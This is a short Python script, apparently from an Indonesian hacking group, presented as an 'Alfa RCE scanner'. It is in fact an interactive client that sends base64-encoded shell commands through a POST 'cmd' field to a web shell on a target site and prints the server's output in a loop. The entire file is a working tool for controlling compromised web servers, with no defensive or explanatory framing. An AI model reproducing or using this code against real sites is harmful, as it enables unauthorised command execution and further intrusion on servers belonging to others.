import requests
from termcolor import colored
from base64 import b64encode
import re

def azp(text,color):
    print(colored(text,color))

def ain(text,color):
    input(colored(text,color))
    
azp("Simple Alfa Rce Scanner\nCoded By 4dsec\nAzathoth Project",'cyan')
try:
    s = input(colored("Site: ",'cyan'))
except KeyboardInterrupt:
    exit()

while True:  # Perulangan
    c = input(colored("Command: ",'green')).encode() # Menerima inputan dari user
    e = b64encode(c) # Mengencode ke base64
    try:
        p = requests.post(str(s),data={'cmd':bytes(e)}).text # Request post cmd dengan command yg sudah diberikan oleh user
        rg = p.replace("<pre>","").replace("</pre>","") # Mereplace tag html pre yang ada di server setalh command dimasukkan
        if rg != "": # Mengecek apakah ada konten (Berhasil/tidak) Command yang telah diberikan oleh user
            ain(rg,'green') # Print output Berhasil
            
        else:
            ain("Mungkin Cmdnya salah/not vuln",'red')  # Print output Gagal
    except Exception as e:  # Exception jika terjadi kesalahan
        print(e)
        #print("Mungkin Website Ga Vuln")
    ty = input("Lanjut? (y/n): ")  # Menanyakan Perulangan jika ingin dilanjut
    if ty == "y": 
        continue
    else:
        break
